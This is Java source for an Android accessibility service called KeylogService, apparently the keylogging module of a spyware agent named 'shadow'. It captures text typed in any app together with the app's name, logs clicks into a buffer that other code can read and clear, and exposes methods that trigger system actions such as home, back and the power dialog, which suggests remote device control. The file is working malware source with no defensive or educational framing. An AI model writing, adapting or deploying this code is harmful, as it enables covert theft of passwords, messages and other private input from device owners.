package com.shadow.agent;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.util.List;

public class KeylogService extends AccessibilityService {

    private static final String TAG = "SHADOW_KEYLOG";
    private static KeylogService instance;
    private static final StringBuilder buffer = new StringBuilder();
    private static final int MAX_SIZE = 5000;

    public static KeylogService getInstance() { return instance; }

    public static String getLog() {
        return buffer.toString();
    }

    public static void clearLog() {
        buffer.setLength(0);
    }

    public static boolean performBack() {
        if (instance == null) return false;
        return instance.performGlobalAction(GLOBAL_ACTION_BACK);
    }

    public static boolean performHome() {
        if (instance == null) return false;
        return instance.performGlobalAction(GLOBAL_ACTION_HOME);
    }

    public static boolean performRecents() {
        if (instance == null) return false;
        return instance.performGlobalAction(GLOBAL_ACTION_RECENTS);
    }

    public static boolean performNotifications() {
        if (instance == null) return false;
        return instance.performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
    }

    public static boolean performPowerDialog() {
        if (instance == null) return false;
        return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
    }

    @Override
    public void onServiceConnected() {
        instance = this;
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                | AccessibilityEvent.TYPE_VIEW_FOCUSED
                | AccessibilityEvent.TYPE_VIEW_CLICKED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Log.d(TAG, "Keylog service connected");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                List<CharSequence> text = event.getText();
                if (text != null && !text.isEmpty()) {
                    String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
                    String content = text.get(0).toString();
                    buffer.append("[").append(pkg).append("] ").append(content).append("\n");
                    if (buffer.length() > MAX_SIZE) buffer.delete(0, buffer.length() - MAX_SIZE);
                }
            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
                buffer.append("[CLICK] ").append(pkg).append("\n");
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        instance = null;
        super.onDestroy();
    }
}